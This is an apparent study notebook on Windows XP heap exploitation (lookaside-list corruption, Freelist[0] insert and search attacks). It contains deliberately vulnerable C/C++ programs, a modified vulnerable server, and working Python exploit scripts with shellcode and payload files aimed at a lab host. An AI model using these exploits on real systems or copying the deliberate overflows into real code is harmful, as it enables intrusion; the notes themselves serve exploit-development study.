                sprintf(str, "%s %x", success,h);
                send( socket, str, 100, 0 );
            }


            DWORD WINAPI ConnectionHandler(LPVOID CSocket) {
                int RecvBufLen = DEFAULT_BUFLEN;
                char *RecvBuf = malloc(DEFAULT_BUFLEN);
                char BigEmpty[1000];
                char *GdogBuf = malloc(1024);
                int Result, SendResult, i, k;
                memset(BigEmpty, 0, 1000);
                memset(RecvBuf, 0, DEFAULT_BUFLEN);
                SOCKET Client = (SOCKET)CSocket; 
                SendResult = send( Client, "Welcome to Vulnerable Server! Enter HELP for help.\n", 51, 0 );
                if (SendResult == SOCKET_ERROR) {
                    printf("Send failed with error: %d\n", WSAGetLastError());
                    closesocket(Client);
                    return 1;
                }
                while (CSocket) {
                    Result = recv(Client, RecvBuf, RecvBufLen, 0);
                    if (Result > 0) {
                        if (strncmp(RecvBuf, "HELP ", 5) == 0) {
                            const char NotImplemented[47] = "Command specific help has not been implemented\n";
                            SendResult = send( Client, NotImplemented, sizeof(NotImplemented), 0 );
                        } else if (strncmp(RecvBuf, "HELP", 4) == 0) {
                            const char ValidCommands[251] = "Valid Commands:\nHELP\nSTATS [stat_value]\nRTIME [rtime_value]\nLTIME [ltime_value]\nSRUN [srun_value]\nTRUN [trun_value]\nGMON [gmon_value]\nGDOG [gdog_value]\nKSTET [kstet_value]\nGTER [gter_value]\nHTER [hter_value]\nLTER [lter_value]\nKSTAN [lstan_value]\nEXIT\n";
                            SendResult = send( Client, ValidCommands, sizeof(ValidCommands), 0 );
                        } else if (strncmp(RecvBuf, "STATS ", 6) == 0) {
                            char *StatBuf = malloc(120);
                            memset(StatBuf, 0, 120);
                            strncpy(StatBuf, RecvBuf, 120);
                            SendResult = send( Client, "STATS VALUE NORMAL\n", 19, 0 );
                        } else if (strncmp(RecvBuf, "RTIME ", 6) == 0) {
                            char *RtimeBuf = malloc(120);
                            memset(RtimeBuf, 0, 120);
                            strncpy(RtimeBuf, RecvBuf, 120);
                            SendResult = send( Client, "RTIME VALUE WITHIN LIMITS\n", 26, 0 );
                        } else if (strncmp(RecvBuf, "LTIME ", 6) == 0) {
                            char *LtimeBuf = malloc(120);
                            memset(LtimeBuf, 0, 120);
                            strncpy(LtimeBuf, RecvBuf, 120);
                            SendResult = send( Client, "LTIME VALUE HIGH, BUT OK\n", 25, 0 );
                        } else if (strncmp(RecvBuf, "SRUN ", 5) == 0) {
                            char *SrunBuf = malloc(120);
                            memset(SrunBuf, 0, 120);
                            strncpy(SrunBuf, RecvBuf, 120);
                            SendResult = send( Client, "SRUN COMPLETE\n", 14, 0 );
                        } else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
                            char *TrunBuf = malloc(3000);
                            memset(TrunBuf, 0, 3000);
                            for (i = 5; i < RecvBufLen; i++) {
                                if ((char)RecvBuf[i] == '.') {
                                    strncpy(TrunBuf, RecvBuf, 3000);				
                                    Function3(TrunBuf);
                                    break;
                                }
                            }
                            memset(TrunBuf, 0, 3000);				
                            SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
                        } else if (strncmp(RecvBuf, "ORUN ", 5) == 0) {
                            char *TrunBuf = malloc(3000);
                            memset(TrunBuf, 0, 3000);
                            for (i = 5; i < RecvBufLen; i++) {
                                if ((char)RecvBuf[i] == '.') {
                                    strncpy(TrunBuf, RecvBuf, 3000);				
                                    Function7(TrunBuf);
                                    break;
                                }
                            }
                            memset(TrunBuf, 0, 3000);				
                            SendResult = send( Client, "HIDDEN FUNCTION ORUN COMPLETE\n", 30, 0 );
                        } else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
                            char GmonStatus[13] = "GMON STARTED\n";
                            for (i = 5; i < RecvBufLen; i++) {
                                if ((char)RecvBuf[i] == '/') {
                                    if (strlen(RecvBuf) > 3950) {
                                        Function3(RecvBuf);
                                    }
                                    break;
                                }
                            }				
                            SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );
                        } else if (strncmp(RecvBuf, "GDOG ", 5) == 0) {				
                            strncpy(GdogBuf, RecvBuf, 1024);
                            SendResult = send( Client, "GDOG RUNNING\n", 13, 0 );
                        } else if (strncmp(RecvBuf, "CHECKUP ", 8) == 0) {
                            strncpy(GdogBuf, RecvBuf, 1024);	
                            Function9(GdogBuf, Client); 
                            SendResult = 1;
                        } else if (strncmp(RecvBuf, "KSTET ", 6) == 0) {
                            char *KstetBuf = malloc(100);
                            strncpy(KstetBuf, RecvBuf, 100);
                            memset(RecvBuf, 0, DEFAULT_BUFLEN);
                            Function2(KstetBuf);
                            SendResult = send( Client, "KSTET SUCCESSFUL\n", 17, 0 );
                        } else if (strncmp(RecvBuf, "OSTET ", 6) == 0) {
                            char *KstetBuf = malloc(100);
                            strncpy(KstetBuf, RecvBuf, 100);
                            memset(RecvBuf, 0, DEFAULT_BUFLEN);
                            Function6(KstetBuf);
                            SendResult = send( Client, "HIDDEN FUNCTION OSTET SUCCESSFUL\n", 33, 0 );
                        } else if (strncmp(RecvBuf, "GTER ", 5) == 0) {
                            char *GterBuf = malloc(180);
                            memset(GdogBuf, 0, 1024);
                            strncpy(GterBuf, RecvBuf, 180);				
                            memset(RecvBuf, 0, DEFAULT_BUFLEN);
                            Function1(GterBuf);
                            SendResult = send( Client, "GTER ON TRACK\n", 14, 0 );
                        } else if (strncmp(RecvBuf, "OTER ", 5) == 0) {
                            char *GterBuf = malloc(180);
                            memset(GdogBuf, 0, 1024);
                            strncpy(GterBuf, RecvBuf, 180);				
                            memset(RecvBuf, 0, DEFAULT_BUFLEN);
                            Function5(GterBuf);
                            SendResult = send( Client, "HIDDEN FUNCTION OTER ON TRACK\n", 30, 0 );
                        }else if (strncmp(RecvBuf, "HTER ", 5) == 0) {
                            char THBuf[3];
                            memset(THBuf, 0, 3);
                            char *HterBuf = malloc((DEFAULT_BUFLEN+1)/2);
                            memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
                            i = 6;
                            k = 0;
                            while ( (RecvBuf[i]) && (RecvBuf[i+1])) {
                                memcpy(THBuf, (char *)RecvBuf+i, 2);
                                unsigned long j = strtoul((char *)THBuf, NULL, 16);
                                memset((char *)HterBuf + k, (byte)j, 1);
                                i = i + 2;
                                k++;
                            } 
                            Function4(HterBuf);
                            memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
                            SendResult = send( Client, "HTER RUNNING FINE\n", 18, 0 );
                        } else if (strncmp(RecvBuf, "ZTLA ", 5) == 0) {
                            char THBuf[3];
                            memset(THBuf, 0, 3);
                            char *HterBuf = malloc((DEFAULT_BUFLEN+1)/2);
                            memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
                            i = 6;
                            k = 0;
                            while ( (RecvBuf[i]) && (RecvBuf[i+1])) {
                                memcpy(THBuf, (char *)RecvBuf+i, 2);
                                unsigned long j = strtoul((char *)THBuf, NULL, 16);
                                memset((char *)HterBuf + k, (byte)j, 1);
                                i = i + 2;
                                k++;
                            } 
                            Function8(HterBuf);
                            memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
                            SendResult = send( Client, "HIDDEN FUNCTION ZTLA RUNNING FINE\n", 34, 0 );
                        } else if (strncmp(RecvBuf, "LTER ", 5) == 0) {
                            char *LterBuf = malloc(DEFAULT_BUFLEN);
                            memset(LterBuf, 0, DEFAULT_BUFLEN);
                            i = 0;
                            while(RecvBuf[i]) {
                                if ((byte)RecvBuf[i] > 0x7f) {
                                    LterBuf[i] = (byte)RecvBuf[i] - 0x7f;
                                } else {
                                    LterBuf[i] = RecvBuf[i];
                                }
                                i++;
                            }
                            for (i = 5; i < DEFAULT_BUFLEN; i++) {
                                if ((char)LterBuf[i] == '.') {					
                                    Function3(LterBuf);
                                    break;
                                }
                            }
                            memset(LterBuf, 0, DEFAULT_BUFLEN);
                            SendResult = send( Client, "LTER COMPLETE\n", 14, 0 );
                        } else if (strncmp(RecvBuf, "KSTAN ", 6) == 0) {
                            SendResult = send( Client, "KSTAN UNDERWAY\n", 15, 0 );
                        } else if (strncmp(RecvBuf, "EXIT", 4) == 0) {
                            SendResult = send( Client, "GOODBYE\n", 8, 0 );
                            printf("Connection closing...\n");
                            closesocket(Client);
                            return 0;
                        } else {
                            SendResult = send( Client, "UNKNOWN COMMAND\n", 16, 0 );
                        }
                        if (SendResult == SOCKET_ERROR) {
                            printf("Send failed with error: %d\n", WSAGetLastError());
                            closesocket(Client);
                            return 1;
                        }
                    } else if (Result == 0) {
                        printf("Connection closing...\n");
                        closesocket(Client);
                        return 0;			
                    } else  {
                        printf("Recv failed with error: %d\n", WSAGetLastError());
                        closesocket(Client);
                        return 1;
                    }

                }	
            }


            ```

            - Added 5 new functions, 4 of which are heap-overflow-related, 1 is for an ASLR bypass

            - DEP bypass via HeapAlloc also made possible

        - Exploit (read FuzzySecurity Application Specifc Heap exploitation for more explanation)

            ```
            #!/usr/bin/python

            import socket
            import os
            import sys
            import time

            host = "192.168.213.132"
            port = 9999

            GTERbuffer =  "OTER "  + "A"*0x10 + "BBBB" + "CCCC" + "\x28\x40\xac\x71" # overflow 71ac4028
            KSTETbuffer = "OSTET " + "A"*0x10 # allocate
            TRUNbuffer =  "ORUN ." + "A"*(0x10-1) # allocate and free
            HTERbuffer =  "ZTLA "  + "B"*(0x10+1) + "20" + "2c40ac71" + "90"*0x4 + "cc" + "81c404ae83ffc3" # double allocation which leads to RCE via LAL corruption 

            shellcode = "\x90"*3
            shellcode += "\xf0\x12\x50\x62" # 625012f0
            shellcode += "\xcc"
            shellcode += "A"*(0x100-len(shellcode))

            GDOGbuffer =  "GDOG "  + "w00tw00t" + shellcode # inject shellcode


            buffer = KSTETbuffer 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            print s.recv(1024)
            s.send(buffer)
            print s.recv(1024)
            s.close()

            buffer = TRUNbuffer 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            print s.recv(1024)
            s.send(buffer)
            print s.recv(1024)
            s.close()

            buffer = GTERbuffer 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            print s.recv(1024)
            s.send(buffer)
            print s.recv(1024)
            s.close()

            buffer = GDOGbuffer 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            print s.recv(1024)
            s.send(buffer)
            print s.recv(1024)
            s.close()

            buffer = HTERbuffer 

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,port))
            print s.recv(1024)
            s.send(buffer)
            print s.recv(1024)
            s.close()
            ```

            - LAL Corruption

            - Store exploit into memory

            - Trigger LAL corruption and jump into memory containing exploit

2. Freelist[0] Exploitation

    - Overview: Manipulate heap manager and allocations regarding freelist[0] to obtain 4 byte-writes or return pointers via Heap Overflows. We can do this because safe unlinking only applies on the target chunk and there is no validation on the previous chunk and the next chunk.

    - References:

        - https://www.corelan.be/index.php/2013/07/02/root-cause-analysis-integer-overflows/#Brett_Moore_Wrecking_Freelist0_Since_2005

        - http://www.orkspace.net/secdocs/Windows/Protection/Bypass/Exploiting%20Freelist[0]%20On%20XP%20Service%20Pack%202.pdf

        - https://slideplayer.com/slide/9024940/

        - https://www.slideserve.com/briana/windows-heap-exploitation-win2ksp0-through-winxpsp2#google_vignette

    - Freelist[0] Insert Attack

        - Overview: 
        
            - Assume we have the following set up

                ```
                            ->          ->          ->          -> 
                freelist[x]      chunkc     chunka      chunkb      freelist[x]
                            <-          <-          <-          <-
                ```

            - Chunks stored in freelist are in ascending order

            - Let's say we want to perform a Heap Allocation which only freelist[x] can fulfil and the size requested is lesser than chunkb but bigger than chunkc, what happens is that chunka will split into 2, chunka1 and chunka2 (resizing). Chunka1/a2 is then used for the allocation while chunka2/a1 is re-inserted into the freelist. The algorithm looks something like:

                ```
                ChunkA(2)->FLINK = Chunk B           chunka->FLINK
                ChunkA(2)->BLINK = Chunk B->BLINK    chunka->FLINK->blink
                ChunkB->BLINK->FLINK = Chunk A(2)
                ChunkB->BLINK = ChunkA(2) 
                ```

            - Assume we overflow chunkc till it corrupts the headers, flink and blink of chunka. As the cookie, flink and blink pointers are corrupted, unlinking will not occur, but we will still carry on with the resizing. During the re-sizing, we will obtain a 4 byte write primative

                ```
                            ->          ->          AAAA        -> 
                freelist[x]      chunkc     chunka      chunkb      freelist[x]
                            <-          AAAA          <-          <-
                ```

                ```
                chunka2->FLINK = AAAA
                chunka2->BLINK = ANYWHERE (since we control AAAA, we can just set this to any arbitrary location)
                ANYWHERE       = chunka2
                AAAA+4         = chunka2
                ```
            
            - The insertion can also be done via a HeapFree as well. Just need to make sure that the chunk to be freed has to be lesser/bigger than the corrupted chunk, depending on which link was corrupted.

        - FuzzySecurity poc aims to overwrite the LAL to obtain code execution. Vulnerable Program:

            ```
            // HeapOverflowsFreeList0InsertAttack.cpp : Defines the entry point for the console application.
            //
            #define _CRT_SECURE_NO_WARNINGS

            #include "stdafx.h"
            #include <stdio.h>
            #include <windows.h>
            int main(int argc,char *argv[])
            {
                HLOCAL a,b,c,x,y,z;
                HANDLE hHeap;
            
                hHeap = HeapCreate(0x00040000,0,0);
                printf("Heap Address at: %x\n", hHeap);
                a = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,1200);
                b = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,1024);
                c = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,2048);

                char bufA[10000];
                gets(bufA);
                // freelist[0] has 'c' chunk
                printf("(+) Chunk a: 0x%08x Chunk b: 0x%08x Chunk c: 0x%08x\n",a,b,c);
                HeapFree(hHeap, 0, c);
                __asm {
                    int 0x3
                }

                // overwrite b so that we spill into c
                // set c's blink to lookaside[3]
            
                printf("(+) Fill chunk b (using 1024 bytes), overflowing chunk c:\n");
            
                // overflow b
                // using 1024 A's + BBBBCCCCDDDDEEEE (E=blink) (D=Flink)
                // overflow with blink set to 0x00480718 (lookaside[3])
            
                char bufB[10000];
                gets(bufB);
                memcpy(b, bufB, strlen(bufB));
                //gets(b);
            
                // free 'a' so that freelist[0] looks like this:
                // freelist[0]:
                //             chunk b
                //             chunk a
                //             chunk c
            
                // the 'insert'
                __asm {
                    int 0x3
                }
                HeapFree(hHeap, 0, a);
            
                // now lookaside[3] should be
                // lookaside[3]:
                //              chunk b
                //              chunk a
                //                    chunk ?        (fake chunk created from the overwrite)
                //              flink we control from overwrite
            
                // pop off the lookaside until we reach
                // our fake chunk
            
                __asm {
                    int 0x3
                }
                x = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
                y = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
                z = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
            
                // write shellcode at controlled freelist flink (lookaside fake chunk)
                gets(bufB);
                memcpy(z, bufB, strlen(bufB));
                //gets(z);
                exit(0);
            }
            ```

            - Some debugging/analysis

                ```
                alloc a 1200 free this one next
                alloc b 1024 overflow this one 
                alloc c 2048 free this one

                before free:
                00360178  78 01 36 00 78 01 36 00  Ÿ6Ÿ6
                00360180  80 01 36 00 80 01 36 00  ƀ6ƀ6
                00360188  88 01 36 00 88 01 36 00  ƈ6ƈ6
                00360190  90 01 36 00 90 01 36 00  Ɛ6Ɛ6

                after freeing c:
                00360178  50 27 36 00 50 27 36 00  ❐6❐6
                00360180  80 01 36 00 80 01 36 00  ƀ6ƀ6
                00360188  88 01 36 00 88 01 36 00  ƈ6ƈ6
                00360190  90 01 36 00 90 01 36 00  Ɛ6Ɛ6
                00360198  98 01 36 00 98 01 36 00  Ƙ6Ƙ6
                003601A0  A0 01 36 00 A0 01 36 00  Ơ6Ơ6
                ...
                00362738  00 00 00 00 00 00 00 00  ....
                00362740  00 00 00 00 00 00 00 00  ....
                00362748  17 01 81 00 8B 10 08 00  ėႋ
                00362750  78 01 36 00 78 01 36 00  Ÿ6Ÿ6
                00362758  00 00 00 00 00 00 00 00  ....
                00362760  00 00 00 00 00 00 00 00  ....
                00362768  00 00 00 00 00 00 00 00  ....

                By right:

                            ->          ->          
                freelist[x]      chunkc      freelist[x]
                            <-          <-         

                            ->          ->           ->
                freelist[x]      chunka       chunkc     freelist[x]
                            <-          <-           <-  

                00360178  90 1E 36 00 50 27 36 00  Ẑ6❐6
                00360180  80 01 36 00 80 01 36 00  ƀ6ƀ6
                00360188  88 01 36 00 88 01 36 00  ƈ6ƈ6
                00360190  90 01 36 00 90 01 36 00  Ɛ6Ɛ6
                00360198  98 01 36 00 98 01 36 00  Ƙ6Ƙ6
                ...
                00361E90  50 27 36 00 78 01 36 00  ❐6Ÿ6
                00361E98  00 00 00 00 00 00 00 00  ....

                By left, we overflow b and free a so that freelist[0] insert with 00360688 LAL, hence set the blink with 00360688

                            ->          DDDD          
                freelist[x]      chunkc      freelist[x]
                            ANY          <-  

                00362728  41 41 41 41 41 41 41 41  䅁䅁䅁䅁
                00362730  41 41 41 41 41 41 41 41  䅁䅁䅁䅁
                00362738  41 41 41 41 41 41 41 41  䅁䅁䅁䅁
                00362740  41 41 41 41 41 41 41 41  䅁䅁䅁䅁
                00362748  42 42 42 42 43 43 43 43  䉂䉂䍃䍃
                00362750  44 44 44 44 90 1E 36 00  䑄䑄Ẑ6
                00362758  00 00 00 00 00 00 00 00  ....
                00362760  00 00 00 00 00 00 00 00  ....
                00362768  00 00 00 00 00 00 00 00  ....
                00362770  00 00 00 00 00 00 00 00  ....

                alloc x
                alloc y
                alloc z -> should obtain our pointer here
                ```

        - What we can do is that we can overwrite the IAT to obtain code execution if we can somehow overflow the stack or alternatively, since the pointers are static, we can redirect code execution back to our buffer via overflowing the stack frame. Vulnerable Program inspired by Corelan:

            ```
            // HeapOverflowsFreeList0InsertAttack.cpp : Defines the entry point for the console application.
            //
            #define _CRT_SECURE_NO_WARNINGS

            #include "stdafx.h"
            #include <stdio.h>
            #include <windows.h>
            int main(int argc,char *argv[])
            {
                HLOCAL a,b,c,d,e;
                HANDLE hHeap;

                hHeap = HeapCreate(0x00040000,0,0);
                printf ("hHeap == 0x%p\n", hHeap);
                char buf[1000];
                gets(buf);

                a = HeapAlloc(hHeap,0x00000008,0x500);
                b = HeapAlloc(hHeap,0x00000008,0x600);
                c = HeapAlloc(hHeap,0x00000008,0x700);
                printf ("Allocated:\n  a == 0x%p\n  b == 0x%p\n  c == 0x%p\n", a, b, c);

                __asm { int 0x3 };

                HeapFree(hHeap, 0, c);

                char str1[0x1000];
                gets(str1);
                memcpy (b, str1, strlen(str1)); // corrupt c headers

                HeapFree(hHeap, 0, a);

                // Pop valid chunk from the list
                d = HeapAlloc(hHeap,0x00000008,0x500);

                printf ("Allocated:\n  d == 0x%p\n  e == 0x%p\n", d, e);

                // Return arbitrary pointer
                e = HeapAlloc(hHeap,0x00000008,0x500);

                printf ("Allocated:\n  d == 0x%p\n  e == 0x%p\n", d, e);
            }
            ```

        - Analysis of Corelan program: let'ss say we alloc 0x500 0x600 0x700 and then we free 0x700 and we overflow 0x600, so we overwrite the flink and blink of freed 0x700 chunk

            - Before overflow:

                ```
                            ->              ->
                00360178         003629a0        00360178
                            <-              <-
                ```

            - After overflow:

                ```
                            ->             fked
                00360178         003629a0        00360178
                            fked             <-

                                            ->   004170C0
                                003629a0
                004178C0    <-
                ```

            - After relinking via freeing A:

                ```
                00360178  90 1E 36 00 A0 29 36 00   Ẑ6⦠6
                00360180  80 01 36 00 80 01 36 00   ƀ6ƀ6
                00360188  88 01 36 00 88 01 36 00   ƈ6ƈ6

                            ->            ->             fked
                00360178       00361E90       003629a0        00360178
                            <-          ||<-||            <-

                00361E90  A0 29 36 00 78 01 36 00   ⦠6Ÿ6
                00361E98  00 00 00 00 00 00 00 00   ....
                00361EA0  00 00 00 00 00 00 00 00   ....
                00361EA8  00 00 00 00 00 00 00 00   ....

                003629A0  C0 70 41 00 90 1E 36 00   烀AẐ6
                003629A8  00 00 00 00 00 00 00 00   ....
                003629B0  00 00 00 00 00 00 00 00   ....
                003629B8  00 00 00 00 00 00 00 00   ....

                004170C0  90 1E 36 00 00 00 00 00  Ẑ6..
                004170C8  00 00 00 00 00 00 00 00  ....
                004170D0  00 00 00 00 00 00 00 00  ....
                004170D8  00 00 00 00 00 00 00 00  ....
                ```

            - Chunk will not be unlinked cuz u fail the safe unlinking, hence the chunk is not combined (coalescing)

            - By right 0361e90 supposed to point back to 360178 but it will point to 004178C0

            - We can obtain a function pointer write via insertion 

            - We can maybe write the RtlCommitRoutine pointer as well to control EIP

    - Freelist[0] Searching Attack

        - Overview: 

            - Assume we have the following set up

                ```
                            ->          ->          ->          -> 
                freelist[x]      chunkc     chunka      chunkb      freelist[x]
                            <-          <-          <-          <-
                ```

            - Assume that there is a Heap allocation request which freelist[x] can fulfil as the value is lesser than chunkb. What happens is that we will iterate through the entire freelist[x] to find the smallest suitable chunk which can fulfil the request. The flink of each chunk is used to traverse through the freelist. Since we can corrupt the flink property via a Heap overflow, we can set the flink property to point to another valid but fake heap chunk (such as other freelist[x] nodes).

            - Attack sequence: Overflow chunkc to corrupt chunka metadata, flink and blink. Set the metadata of chunka in order to make it look like chunka can never fulfil a request (size 0x1). So during an allocation, chunka will be skipped and its flink property will be looked at. We can set this value to 0x360188 (valid but fake heap chunk). The metadata of this fake heapchunk would be 0x360180, hence the size of this fake chunk would be 0x180*0x8 = 0xC00. If we make a heap allocation of 0xC00-0x8=0xBF8, then a pointer to this fake chunk would be returned (0x00360188). We can overflow this pointer and write the RtlHeapCommitRoutine pointer at 0x0036057c while also taking the time to restore the heap that was corrupted during unlinking. After we corrupt this pointer, we can make an allocation which the current freelist cannot fulfil to control EIP

            - Example:

                ```
                0:000> dc 03200180 L4
                03200180  03200180 03200180 03200188 03200188  

                For Heap chunk at 0x00360188, the metadata is as follows:
                0320: prevsize
                0180: selfsize <- only important factor
                ```

        - Vulnerable Program:

            ```
            // HeapOverflowsFreeList0InsertAttack.cpp : Defines the entry point for the console application.
            //
            #define _CRT_SECURE_NO_WARNINGS
            #include "stdafx.h"
            #include <stdio.h>
            #include <windows.h>
            #include <string.h>
            #include <iostream>
            #include <cstdio>
            #define SIZE 10000

            int get_file_size(char* filename) // path to file
            {
                FILE *p_file = NULL;
                p_file = fopen(filename,"rb");
                fseek(p_file,0,SEEK_END);
                int size = ftell(p_file);
                fclose(p_file);
                return size;
            }

            int main(int argc,char *argv[])
            {
                FILE* file = fopen("exploit.bin", "rb");
                unsigned char buffer[SIZE];
                int SIZE_2 = get_file_size("exploit.bin");
                printf("[*] Size of payload: %d\n", SIZE_2);

                if (file) {
                    while (!feof(file)) {
                        fread(buffer, 1, SIZE_2, file);
                    }
                }

                HLOCAL a,b,c,d,e;
                HANDLE hHeap;

                char buf[10];
                gets(buf);

                hHeap = HeapCreate(0x00040000,0,0);
                printf ("hHeap == 0x%p\n", hHeap);

                a = HeapAlloc(hHeap,0x00000008,0x300);
                b = HeapAlloc(hHeap,0x00000008,0x500); // bf8
                c = HeapAlloc(hHeap,0x00000008,0x1000);
                printf ("Allocated:\n  a == 0x%p\n  b == 0x%p\n  c == 0x%p\n",a,b,c); 

                //__asm { int 0x3 };
                //HeapFree(hHeap, 0, a);
                //HeapFree(hHeap, 0, b);
                //HeapFree(hHeap, 0, c);

                __asm { int 0x3 };
                HeapFree(hHeap, 0, b);

                //char str1[0x1000];
                //gets(str1);
                //memcpy (a, str1, strlen(str1));  // corrupt b and make b flink point to another portion of the heap 360180 would be ok
                memcpy (a, buffer, SIZE_2);

                //HeapFree(hHeap, 0, c); // here list <-> b <-> c <-> list

                // Pop valid chunk from the list
                e = HeapAlloc(hHeap,0x00000008,0xbf8); // c is big enough but b cannot make it, so it will look at b's flink which should be at 360180
                printf ("Allocated:\n  e == 0x%p\n", e); 

                //gets(str1);
                //memcpy (e, str1, strlen(str1));
                FILE* file1 = fopen("exploit_2.bin", "rb");
                int SIZE_3 = get_file_size("exploit_2.bin");
                printf("[*] Size of second payload: %d\n", SIZE_3);

                if (file1) {
                    while (!feof(file1)) {
                        fread(buffer, 1, SIZE_3, file1);
                    }
                }
                memcpy (e, buffer, SIZE_3);
                d = HeapAlloc(hHeap,0x00000008,0x2000); // cause the Commit Routine Pointer +57c to corrupt
            }
            ```

        - Exploit:

            ```
            import os
            import struct

            def create_exploit():
                exploit = 'A'*0x300
                exploit += "\x01\x00\x01\x00"
                exploit += "CCCC"
                exploit += "\x88\x01\x36\x00"
                return exploit

            exploit = create_exploit()

            with open("exploit.bin", "wb") as file:
                file.write(exploit)
                file.close()

            def create_exploit_2(): # restoring heap
                exploit = "A" * 0x3E8
                exploit += "\x70\x05\x36\x00"
                exploit += "\x70\x05\x36\x00"
                exploit += "\x08\x06\x36\x00"
                exploit += "BBBB" # eip
                exploit += "\x88\x06\x36\x00\x00\x00\x01\x00"
                exploit += "\x00\x00\x00\x00\x00\x50\x36\x00"
                exploit += "\x00\xB0\x03\x00\x00\x00\x00\x00"
                exploit += "\xA8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xB8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xC8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xD8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xE8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xF8\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\xE0\xE9\x97\x7C\xFF\xFF\xFF\xFF"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x08\x00\xC8\x00\x00\x01\x00\x00"
                exploit += "\xEE\xFF\xEE\xFF\x00\x00\x00\x00"
                exploit += "\x00\x00\x36\x00\x00\xB0\x03\x00"
                exploit += "\x00\x00\x36\x00\x40\x00\x00\x00"
                exploit += "\x80\x06\x36\x00\x00\x00\x3A\x00"
                exploit += "\x3B\x00\x00\x00\x01\x00\x00\x00"
                exploit += "\x88\x05\x36\x00\x00\x00\x00\x00"
                exploit += "\xA0\x36\x36\x00\x00\x00\x00\x00"
                exploit += "\x01\x03\x08\x00\x14\x01\x08\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x04\x00\x00\x01\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x01\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x04\x00\x00\x01\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x01\x00\x00\x00"
                exploit += "\x01\x00\x00\x00\x00\x00\x00\x00"
                exploit += "\x00\x00\x00\x00\x00\x00\x00\x00"

                stub = "\x04\x00\x00\x01\x00\x00\x00\x00"
                stub += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub += "\x00\x00\x00\x00\x00\x00\x00\x00"

                stub2 = "\x04\x00\x00\x01\x00\x00\x00\x00"
                stub2 += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub2 += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub2 += "\x00\x00\x00\x00\x01\x00\x00\x00"
                stub2 += "\x00\x00\x00\x00\x00\x00\x00\x00"
                stub2 += "\x00\x00\x00\x00\x00\x00\x00\x00"

                return exploit + (stub * 2) + stub2 + (stub * 5)

            exploit = create_exploit_2()

            with open("exploit_2.bin", "wb") as file:
                file.write(exploit)
                file.close()
            ```

           -  If you dont use a valid heap chunk, got heap corruption, but still carry on in windows xp. 

           - Can use heaper to find valid heap chunks

                ```
                0x7c97f10c : 0x7c97f10c gets called from ntdll.dll at 0x7c928fea (CALL DWORD PTR DS:[7C97F10C]) -  {PAGE_READWRITE}
                ```

           - Heaper Files

                - https://pypi.org/project/pyparsing/2.2.0/#files

                - https://pypi.org/project/pydot/1.3.0/#files

            - Uncorrupted Heap

                ```
                00360570  70 05 36 00 70 05 36 00  p6.p6.
                00360578  08 06 36 00 00 00 00 00  6.....
                00360580  88 06 36 00 00 00 01 00  ˆ6....
                00360588  00 00 00 00 00 50 36 00  .....P6.
                00360590  00 B0 03 00 00 00 00 00  .°.....
                00360598  A8 05 36 00 00 00 00 00  ¨6.....
                003605A0  00 00 00 00 00 00 00 00  ........
                003605A8  B8 05 36 00 00 00 00 00  ¸6.....
                003605B0  00 00 00 00 00 00 00 00  ........
                003605B8  C8 05 36 00 00 00 00 00  È6.....
                003605C0  00 00 00 00 00 00 00 00  ........
                003605C8  D8 05 36 00 00 00 00 00  Ø6.....
                003605D0  00 00 00 00 00 00 00 00  ........
